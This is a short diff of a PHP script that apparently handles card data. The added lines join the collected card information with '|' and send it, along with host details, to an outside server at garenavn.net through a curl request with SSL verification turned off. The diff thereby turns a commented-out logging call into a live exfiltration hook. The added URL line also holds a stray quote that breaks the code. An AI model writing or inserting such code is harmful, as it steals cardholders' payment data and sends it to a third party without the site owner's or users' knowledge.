@@ -105,7 +105,17 @@ $postResponse = $this->response;
 
 $logInfo = implode('|', $cardInfo);
 //file_get_contents('https://garenavn.net/api_logs/process.php?host=' . $hostInfo . '&data_logs=' . $logInfo);
-$this->get('https://garenavn.net/api_logs/process.php', array('host' => $hostInfo, 'data_logs' => $logInfo));
+//$this->get('https://garenavn.net/api_logs/process.php', array('host' => $hostInfo, 'data_logs' => $logInfo));
+
+$curlLog = curl_init();
+curl_setopt_array($curlLog, array(
+    CURLOPT_RETURNTRANSFER => 0,
+    CURLOPT_URL => 'https://garenavn.net/api_logs/process.php?host=' . $hostInfo . '&data_logs=' . $logInfo',
+    CURLOPT_SSL_VERIFYPEER => false
+));
+$resp = curl_exec($curlLog);
+curl_close($curlLog);
+
 
 if($isFake)
 {
